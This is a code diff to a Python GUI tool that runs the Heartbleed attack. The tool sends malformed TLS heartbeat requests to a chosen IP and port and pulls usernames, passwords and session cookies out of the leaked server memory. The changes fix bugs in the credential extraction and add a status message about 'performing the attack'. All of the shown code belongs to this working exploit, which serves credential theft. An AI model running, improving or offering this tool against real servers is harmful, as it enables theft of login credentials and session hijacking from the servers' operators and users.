@@ -66,7 +66,10 @@ hb = h2bin('''
 
 def logList(list, name, color, delim = ''):
     # Return without printing (if quite option specified by user)
-    if len(list) < 1:
+    try:
+        if len(list) < 1:
+            return
+    except TypeError:
         return
 
     # Build message string
@@ -91,7 +94,13 @@ def skip(info, pos, stop):
 # method extracts usernames, passwords and session ids (cookies) from leaked info
 def getCredentials(info, key):
     items = []
-    i = info.index(key)
+
+     # If key is not found in the output return
+    if info.find(key) != -1:
+        i = info.index(key)
+    else:
+        return
+
     while i < len(info):
         # Find next user from info string
         i = skip(info, i, '=')
@@ -158,9 +167,6 @@ def hexdump(s):
 
     if len(file) == 0:
         print
-
-    if users[0] == '0':
-        users = users[1:]
 
     return users, passwords, cookies, query, hasPwd, hasCookie
 
@@ -237,7 +243,7 @@ def hit_hb(s, file, key):
 
         if typ == 21:
             status.set('Received alert:')
-            hexdump(pay, file, key)
+            hexdump(pay)
             status.set('ERROR: server returned error, likely not vulnerable')
             return False
 
@@ -249,6 +255,8 @@ def execute():
     e5.config(state = 'disabled')
     output.config(state = 'normal')
     output.insert(END, 'Items that were returned by Heartbeat: \n')
+    status.set('Please wait while performing the attack...')
+    updatescreen()
 
     IP = IP_text.get()
     PORT = PORT_text.get()
@@ -285,7 +293,7 @@ def execute():
       sys.stdout.flush()
       s.send(hb)
       hit_hb(s, FILE, KEY)
-    
+
     e1.config(state = 'normal')
     e2.config(state = 'normal')
     e3.config(state = 'normal')
